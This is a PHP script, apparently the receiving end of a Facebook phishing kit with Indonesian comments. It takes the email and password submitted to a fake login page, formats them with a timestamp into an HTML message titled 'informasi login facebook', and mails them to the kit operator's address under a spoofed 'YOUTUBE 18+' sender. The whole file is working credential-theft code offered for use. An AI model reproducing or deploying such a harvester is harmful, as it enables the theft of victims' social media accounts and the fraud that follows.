<?php
// MENGAMBIL WAKTU JAKARTA ATAU WIB
date_default_timezone_set("Asia/Jakarta");

$email = $_POST['email'];
$password = $_POST['password'];
$time = date('d-m-Y : h-i-s');

if ($email == "" && $password == "") {
    header("Location: index.php");
} else {

$subjek = "FACEBOOK PUNYA { $email }";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
            <tr>
			    <th style="text-align: center;" colspan="3">
                <img src="https://i.im.ge/2022/03/30/lbCq3h.jpg">
                </th>
				</tr>
				
			<tr>
				    <th style="text-align: center;" colspan="3">
                
                </th>
				</tr>

					<th style="text-align: center;" colspan="3"> informasi login facebook </th>
				</tr>
				<tr>
					<td style="border-right: none;">Email / Telepon</td>
					<td style="text-align: center;">$email</td>
				</tr>
                <tr>
					<td style="border-right: none;">Kata Sandi</td>
					<td style="text-align: center;">$password</td>
				</tr>
                <tr>
					<td style="border-right: none;">Result Masuk</td>
					<td style="text-align: center;">$time</td>
				</tr>
					<th style="text-align: center;" colspan="3">&copy; ALEX HOSTING</th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;
include 'email.php';
$sender = 'From: YOUTUBE 18+ <dnscript@gmail.com>';
$headers   = 'MIME-Version: 1.0' . "\r\n";
$headers  .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers  .= $sender. "\r\n";
mail($emailku, $subjek, $pesan, $headers);
}
?>